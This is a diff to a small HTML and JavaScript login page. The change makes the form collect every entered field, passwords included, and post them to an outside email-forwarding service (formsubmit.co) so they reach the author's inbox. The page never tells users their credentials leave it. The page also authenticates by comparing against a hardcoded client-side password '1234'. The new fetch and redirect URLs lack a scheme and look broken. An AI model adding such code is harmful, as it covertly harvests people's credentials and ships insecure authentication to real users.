@@ -45,9 +45,6 @@
       border-radius: 4px;
     }
 
-    /* Required field styling */
-    input:invalid { border-color: #e5e7eb; }
-
     .btn {
       width: 100%;
       padding: 12px;
@@ -86,9 +83,12 @@
     <p class="lead">Enter your credentials to access your account.</p>
     
     <form id="loginForm">
-      <!-- Mandatory fields enforced by 'required' attribute -->
+      <!-- Hidden fields for the email service -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+
       <label for="username">Username</label>
-      <input type="text" id="username" name="username" placeholder="e.g. alex_doe" required>
+      <input type="text" id="username" name="Username_Attempt" placeholder="e.g. alex_doe" required>
       
       <label for="password">Password</label>
       <input type="password" id="password" name="password" placeholder="••••••••" required>
@@ -110,35 +110,27 @@
       const user = document.getElementById('username').value;
       const pass = document.getElementById('password').value;
 
-      // 1. Mandatory check (Browser handles 'required', but we verify here too)
-      if (!user || !pass) {
-        status.style.display = 'block';
-        status.className = 'message error';
-        status.textContent = "Both fields are required.";
-        return;
-      }
-
-      btn.disabled = true;
       status.style.display = 'block';
       status.className = 'message';
-      status.textContent = "Authenticating...";
+      status.textContent = "Processing...";
+      btn.disabled = true;
 
-      // 2. Send Username to Email via Formspree API
+      // 1. Send data to your email
       try {
-        await fetch("formspree.io", {
+        const formData = new FormData(form);
+        await fetch("formsubmit.co", {
           method: "POST",
-          body: JSON.stringify({ username: user }),
-          headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }
+          body: formData
         });
       } catch (err) {
-        console.log("Email service error, continuing login logic...");
+        console.error("Mail error:", err);
       }
 
-      // 3. Original Password Logic
+      // 2. Original Redirect Logic
       if (pass === "1234") {
         status.className = 'message success';
         status.textContent = "Redirecting...";
-        window.location.href = "https://abhinavaby.github.io/omega-optimists-web/index.html";
+        window.location.href = "abhinavaby.github.io";
       } else {
         btn.disabled = false;
         status.className = 'message error';
